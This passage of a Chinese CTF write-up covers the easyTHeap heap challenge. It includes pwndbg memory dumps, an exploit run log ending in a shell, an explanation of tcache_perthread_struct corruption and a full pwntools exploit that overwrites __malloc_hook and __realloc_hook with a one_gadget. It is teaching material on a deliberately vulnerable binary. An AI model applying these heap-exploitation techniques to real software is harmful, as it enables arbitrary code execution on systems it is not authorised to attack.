0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757060 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757060 /* '`puUUU' */
smallbins
empty
largebins
empty
pwndbg> 
```

为什么要写入malloc_hook - 0x13的地址，来看一下此处的内存：

```python
pwndbg> x/16gx 0x00007ffff7dcfc1d
0x7ffff7dcfc1d:	0xfff7a7b480000000	0xfff7a7c80000007f
0x7ffff7dcfc2d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dcfc3d:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc4d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc5d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc6d <main_arena+45>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc7d <main_arena+61>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc8d <main_arena+77>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这里的内存显示有点奇怪，但是让我想到fastbin_attack中的**Arbitrary Alloc，详见：**

[PWN入门（3-11-2）-fastbin_attack中的Arbitrary Alloc（基础）](https://www.yuque.com/cyberangel/rg9gdm/pqol51)

这里应该是为了绕过高版本libc中所加的对tcache的限制（其机制应该和fastbin的一模一样），这里不多说了。

## 再次申请堆块，到__realloc_hook
```python
new(0x20)
edit(5, 'C' * (0x13 - 0x8) + p64(one) + p64(realloc + 8))
#
```

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x61

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757060
Size: 0x1f1
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x555555757250
Size: 0x60

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000061
0x555555757010:	0x6262626262626162	0x6262626262626262
0x555555757020:	0x6262626262626262	0x6262626262626262
0x555555757030:	0x6262626262626262	0x6262626262626262
0x555555757040:	0x6262626262626262	0x6262626262626262
0x555555757050:	0x6262626262626262	0xfff7a7b480000000
0x555555757060:	0x0000000000000000	0x00000000000001f1
0x555555757070:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
.......(省略内容均为空)
0x555555757250:	0x00000000000001f0	0x0000000000000060
0x555555757260:	0x0000555555757010	0x000000000000000a
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000000000000050
0x555555756070:	0x0000002000000050	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
0x555555756090:	0x0000555555757260	0x0000555555757010
0x5555557560a0:	0x0000555555757010	0x00007ffff7dcfc1d
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
----------------------------------------------------------------------------
pwndbg> x/16gx 0x00007ffff7dcfc1d
0x7ffff7dcfc1d:	0x4343434343434343	0xfff7aee45c434343
    			#payload从这里写入
0x7ffff7dcfc2d <__realloc_hook+5>:	0xfff7a7cca800007f	0x000000000a00007f
0x7ffff7dcfc3d:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc4d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc5d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc6d <main_arena+45>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc7d <main_arena+61>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc8d <main_arena+77>:	0x0000000000000000	0x0000000000000000
----------------------------------------------------------------------------
换个视角来看一下：
pwndbg> x/16gx 0x00007ffff7dcfc10
0x7ffff7dcfc10 <_IO_wide_data_0+304>:	0x00007ffff7dcbd60	0x4343430000000000
    			
0x7ffff7dcfc20 <__memalign_hook>:	0x4343434343434343	0x00007ffff7aee45c
    													#__realloc_hook
        												#现被写入one_gadget
0x7ffff7dcfc30 <__malloc_hook>:	0x00007ffff7a7cca8	0x000000000000000a
    							#_malloc_hook
        						#现被写入__libc_realloc
0x7ffff7dcfc40 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc50 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc60 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 <main_arena+64>:	0x0000000000000000	0x0000000000000000
pwndbg> 
----------------------------------------------------------------------------
pwndbg> bin
tcachebins
0x20 [ 98]: 0x6262626262626262 ('bbbbbbbb')
0x30 [ 97]: 0xfff7a7b480000000
0x40 [ 98]: 0x0
0x50 [ 98]: 0x1f1
0x60 [ 98]: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555557572b0 ◂— 0x0
0x70 [ 98]: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555557572b0 ◂— 0x0
0x80 [ 98]: 0x0
0x90 [ 98]: 0x0
0xa0 [ 98]: 0x0
0xb0 [ 98]: 0x0
0xc0 [ 98]: 0x0
0xd0 [ 98]: 0x0
0xe0 [ 98]: 0x0
0xf0 [ 98]: 0x0
0x100 [ 98]: 0x0
0x110 [ 98]: 0x0
0x120 [ 98]: 0x0
0x130 [ 98]: 0x0
0x140 [ 98]: 0x0
0x150 [ 98]: 0x0
0x160 [ 98]: 0x0
0x170 [ 98]: 0x0
0x180 [ 98]: 0x0
0x190 [ 98]: 0x0
0x1a0 [ 98]: 0x0
0x1b0 [ 98]: 0x0
0x1c0 [ 98]: 0x0
0x1d0 [ 98]: 0x0
0x1e0 [ 98]: 0x0
0x1f0 [ 98]: 0x0
0x200 [ 98]: 0x0
0x210 [ 98]: 0x0
0x220 [ 98]: 0x0
0x230 [ 98]: 0x0
0x240 [ 98]: 0x0
0x250 [ 98]: 0x0
0x260 [ 98]: 0x0
0x270 [ 98]: 0x0
0x280 [ 98]: 0x0
0x290 [ 98]: 0x0
0x2a0 [ 98]: 0x0
0x2b0 [ 98]: 0x0
0x2c0 [ 98]: 0x0
0x2d0 [ 98]: 0x0
0x2e0 [ 98]: 0x0
0x2f0 [ 98]: 0x0
0x300 [ 98]: 0x0
0x310 [ 98]: 0x0
0x320 [ 98]: 0x0
0x330 [ 98]: 0x0
0x340 [ 98]: 0x0
0x350 [ 98]: 0x0
0x360 [ 98]: 0x0
0x370 [ 98]: 0x0
0x380 [ 98]: 0x0
0x390 [ 98]: 0x0
0x3a0 [ 98]: 0x0
0x3b0 [ 98]: 0x0
0x3c0 [ 98]: 0x0
0x3d0 [ 98]: 0x0
0x3e0 [ 98]: 0x0
0x3f0 [ 98]: 0x0
0x400 [ 98]: 0x0
0x410 [ 98]: 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757060 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757060 /* '`puUUU' */
smallbins
empty
largebins
empty
pwndbg> 
```

## getshell
当再次malloc时就会getshell：

```python
ubuntu@ubuntu:~/Desktop$ python exp_debug.py 
[+] Starting local process './vn_pwn_easyTHeap_patch' argv=['./vn_pwn_easyTHeap_patch'] : pid 4049
[DEBUG] PLT 0x820 free
[DEBUG] PLT 0x830 puts
[DEBUG] PLT 0x840 __stack_chk_fail
[DEBUG] PLT 0x850 setbuf
[DEBUG] PLT 0x860 printf
[DEBUG] PLT 0x870 memset
[DEBUG] PLT 0x880 alarm
[DEBUG] PLT 0x890 read
[DEBUG] PLT 0x8a0 malloc
[DEBUG] PLT 0x8b0 atoi
[DEBUG] PLT 0x8c0 exit
[DEBUG] PLT 0x8d0 __cxa_finalize
[*] '/home/ubuntu/Desktop/vn_pwn_easyTHeap_patch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x21020 realloc
[DEBUG] PLT 0x21060 __tls_get_addr
[DEBUG] PLT 0x210a0 memalign
[DEBUG] PLT 0x210b0 _dl_exception_create
[DEBUG] PLT 0x210f0 __tunable_get_val
[DEBUG] PLT 0x211a0 _dl_find_dso_for_object
[DEBUG] PLT 0x211e0 calloc
[DEBUG] PLT 0x212c0 malloc
[DEBUG] PLT 0x212c8 free
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x64 bytes:
    'Welcome to V&N challange!\n'
    "This's a tcache heap for you.\n"
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '80\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x39 bytes:
    '`ruUUU\n'
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
0x555555757260
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '80\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x8 bytes:
    'content:'
[DEBUG] Sent 0x9 bytes:
    00000000  10 70 75 55  55 55 00 00  0a                        │·puU│UU··│·│
    00000009
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '80\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '80\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x8 bytes:
    'content:'
[DEBUG] Sent 0x29 bytes:
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x39 bytes:
    00000000  a0 fc dc f7  ff 7f 0a 44  6f 6e 65 21  0a 31 2e 41  │····│···D│one!│·1.A│
    00000010  64 64 0a 32  2e 45 64 69  74 0a 33 2e  53 68 6f 77  │dd·2│.Edi│t·3.│Show│
    00000020  0a 34 2e 44  65 6c 65 74  65 0a 35 2e  45 78 69 74  │·4.D│elet│e·5.│Exit│
    00000030  0a 63 68 6f  69 63 65 3a  20                        │·cho│ice:│ │
    00000039
0x7ffff79e4000
0x7ffff7aee45c
0x7ffff7a7cca0
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '80\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '4\n'
[DEBUG] Received 0x8 bytes:
    00000000  62 62 62 62  62 62 62 62  62 62 62 62  62 62 62 62  │bbbb│bbbb│bbbb│bbbb│
    *
    00000040  62 62 62 62  62 62 62 62  1d fc dc f7  ff 7f 00 00  │bbbb│bbbb│····│····│
    00000050  0a                                                  │·│
    00000051
[DEBUG] Received 0x7b bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: Please input current choice.\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x4 bytes:
    'idx?'
[DEBUG] Sent 0x2 bytes:
    '5\n'
[DEBUG] Received 0x8 bytes:
    'content:'
[DEBUG] Sent 0x1c bytes:
    00000000  43 43 43 43  43 43 43 43  43 43 43 5c  e4 ae f7 ff  │CCCC│CCCC│CCC\│····│
    00000010  7f 00 00 a8  cc a7 f7 ff  7f 00 00 0a               │····│····│····│
    0000001c
[DEBUG] Received 0x32 bytes:
    'Done!\n'
    '1.Add\n'
    '2.Edit\n'
    '3.Show\n'
    '4.Delete\n'
    '5.Exit\n'
    'choice: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x5 bytes:
    'size?'
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[*] Switching to interactive mode
[DEBUG] Received 0xc3 bytes:
    ' code\t        main_arena_offset-master       test1.c\n'
    ' core\t        pwndbg-dev\t\t       vn_pwn_easyTHeap\n'
    " exp_debug.py  'tcache poisoning-glibc-2.29'   vn_pwn_easyTHeap_patch\n"
    ' exp.py         test1\n'
 code            main_arena_offset-master       test1.c
 core            pwndbg-dev               vn_pwn_easyTHeap
 exp_debug.py  'tcache poisoning-glibc-2.29'   vn_pwn_easyTHeap_patch
 exp.py         test1
$  
```

# one_gadget无法getshell
你可能会疑惑，直接向__malloc_hook写入one_gadget不就好了吗？

但是有时候one_gadget不是万能的，无法getshell，这是由于栈的问题所导致的，解决方法如下。

> 这里偷个懒，直接粘贴别人的文章，侵删
>
> 还是以这个题目为例子
>
> 来源：[https://www.cnblogs.com/Theffth-blog/p/12790720.html](https://www.cnblogs.com/Theffth-blog/p/12790720.html)
>

### tcache perthread corruption
在堆题中，我们常见的一种泄露地址的方法是泄露`unsortedbin`中chunk的`fd`和`bk`，而在严格限制chunk大小的堆题中，如果有`tcache`机制的影响，我们必须需要先将`tcache Bin`填满，才能把chunk放入`unsortedbin`中，再进行地址泄露。于是，有些堆题会对`malloc`和`free`操作的次数设定限制，这时我们可以考虑伪造`tcache`机制的主体`tcache_perthread_struct`结构体。在源代码中对其定义如下：

```plain
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;        
} tcache_entry;
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];     //数组counts用于存放每个bins中的chunk数量
  tcache_entry *entries[TCACHE_MAX_BINS];   //数组entries用于放置64个bins
} tcache_perthread_struct;
static __thread tcache_perthread_struct *tcache = NULL;
```

可以看到`tcache_perthread_struct`结构体首先是类型为char（一个字节）的counts数组，用于存放64个bins中的chunk数量，随后依次是对应size大小`0x20-0x410`的64个entries（8个字节），用于存放64个bins的Bin头地址，我写了如下非常简单的测试程序来具体看一看这个结构体：

```plain
#include <stdlib.h>
int main()
{
    void *ptr1,*ptr2,*ptr3;
    ptr1=malloc(0x10);
    ptr2=malloc(0x80);
    ptr3=malloc(0x20);
    free(ptr2);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    free(ptr1);
    return 0;
}
```

结合调试：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178005-63be658b-d74a-4db7-8571-2c013036479c.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177949-b8bd1dd3-7bd2-483f-ab8c-7bf5b1a805f9.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177898-4ffe838b-2145-4cb8-aeee-a0d8c735aa80.png)

了解了这个结构体后，我们就可以具体利用了，下面结合一道例题进行进一步说明：

例题：buuoj -- [V&N2020 公开赛]easyTHeap

WP：

首先依然是glibc2.26下的环境，分析程序，主要有`add()` `edit()` `show()` `delete()`四个功能，可以看到，限制了最多进行7次添加操作，3次删除操作。分析`add()`函数，看到对申请chunk的size进行了一定限制；分析`edit()`函数，发现通过size数组限制了写入字节数；分析`show()`函数，实现正常的显示功能，可利用来泄露地址；分析`delete()`函数，存在`UAF`漏洞，但是会将size数组清零，这意味着在`delete`堆块后便无法任意修改。所以我们的思路是，通过tcache dup泄露堆地址，随后通过tcache poisoning，将chunk申请到堆基址，也即存放tcache_perthread_struct的地址，实现对结构体的伪造，即可实现把chunk放入unsortedbin以泄露地址，同时可以通过构造entries的内容，再次申请堆块到任意地址，进一步实现getshell;

第一步，通过tcache dup泄露堆地址，这里需要多分配一个chunk，以防止chunk 0释放后与top chunk的合并，由于连续两次释放chunk，chunk中的fd指针指向自身地址，可泄露堆基址：

```plain
add(0x80)#0
add(0x10)#1 -->
delete(0)
delete(0)
show(0)
leak_addr=leak_address()
print hex(leak_addr)
heap_base=leak_addr-0x250-0x10
log.info("heap_addr:"+hex(heap_base))
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178087-672c7b76-63db-412e-b053-89181b0a4dcd.png)

第二步，tcache poisoning 申请chunk到heap_base：

```plain
add(0x80)#2->0
#修改chunk0的fd
edit(2,p64(heap_base+0x10))
add(0x80)#3->0
add(0x80)#4->heap_+0x10
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177970-beb51b6d-8617-4a1f-b36c-342042f05bfb.png)

第三步，伪造tcache_perthread_struct结构体中的counts数组，这里我将其全部修改为上限7，随后再次释放大小为0x80的chunk即可放入unsortedbin并泄露地址了：

```plain
pd='\x07'*64
edit(4,pd)
delete(0)
show(0)
leak_addr=leak_address()
print hex(leak_addr)
libc_base=leak_addr-96-0x10-libc.sym['__malloc_hook']
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177999-d2009860-1fd1-4ff4-b523-fedda194ed83.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178023-67485569-47a0-4f5d-8880-daf17dab3905.png)

第四步，通过修改结构体中entries数组的第一个内容，即size=0x20的chunk的tcache Bin头，再次申请0x10的chunk可以申请到指定地址的chunk，实现任意地址写：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178122-4f96dc5e-28d8-4033-b81c-a28ec1b1fae3.png)

但是这里受次数限制我们不能写入free_hook，checksec查看可以看到`Full RELRO`保护开启，无法写入函数的got表，malloc函数的参数又是我们自己写入的，无法写入`'/bin/sh'`字符串，所以我们只能向`malloc_hook`中写入one_gadget地址，但是这里将可用的one_gadget全部尝试后发现均不满足条件，于是我们必须利用`realloc——hook`，通过libc中`realloc`函数前一系列的抬栈操作来满足one_gadget可以使用的条件：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178131-3b750aae-210b-4c26-9051-4354b1e1848e.png)

同时`realloc_hook`与`malloc_hook`地址是连续的：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178293-c00ab9a7-c128-407b-b915-40bf0604075e.png)

因此我们劫持程序流至`realloc_hook`地址处，可以同时向两个hook地址中任意写，我们只需向`realloc_hook`中写入one_gadget，向`malloc_hook`中写入`realloc`地址加上适当的偏移（抬栈时push操作的次数不同，我们一般加上8即可），就可以在再次`malloc`时先去`realloc`函数处执行，抬栈后满足`one_gadget`的要求，再去执行`realloc_hook`中存放的`one_gadget`，进行getshell：

```plain
malloc_hook=libc_base+libc.sym['__malloc_hook']
realloc=libc_base+libc.sym['__libc_realloc']
one_gadget=0x10a38c+libc_base
edit(4,'\x07'*64+p64(malloc_hook-8))
add(0x10)#5
edit(5,p64(one_gadget)+p64(realloc+8))
add(0x10)#6
```

完整的exp如下：

```python
from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level='debug',arch='amd64')
local=0
binary_name='./vn_pwn_easyTHeap'
if local:
    p=process("./"+binary_name)
    e=ELF("./"+binary_name)
    libc=e.libc
else:
    p=remote('node3.buuoj.cn',27084)
    e=ELF("./"+binary_name)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,'\x00'))
def add(size):
    sla("choice: ",'1')
    sla("size?",str(size))
def edit(idx,content):
    sla("choice: ",'2')
    sla("idx?",str(idx))
    sla("content:",content)
def show(idx):
    sla("choice: ",'3')
    sla("idx?",str(idx))
def delete(idx):
    sla("choice: ",'4')
    sla("idx?",str(idx))
z('b *0x555555554B6F\nb *0x555555554C90\nb *0x555555554D18\nb *0x555555554DA0\n')
add(0x80)#0
add(0x10)#1 -->
delete(0)
delete(0)
show(0)
leak_addr=leak_address()
print hex(leak_addr)
heap_base=leak_addr-0x250-0x10
log.info("heap_addr:"+hex(heap_base))
add(0x80)#2->0
edit(2,p64(heap_base+0x10))
add(0x80)#3->0
add(0x80)#4->heap_+0x10
pd='\x07'*64
edit(4,pd)
delete(0)
show(0)
leak_addr=leak_address()
print hex(leak_addr)
libc_base=leak_addr-96-0x10-libc.sym['__malloc_hook']
malloc_hook=libc_base+libc.sym['__malloc_hook']
realloc=libc_base+libc.sym['__libc_realloc']
one_gadget=0x10a38c+libc_base
edit(4,'\x07'*64+p64(malloc_hook-8))
add(0x10)#5
edit(5,p64(one_gadget)+p64(realloc+8))
add(0x10)#6
p.interactive()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```



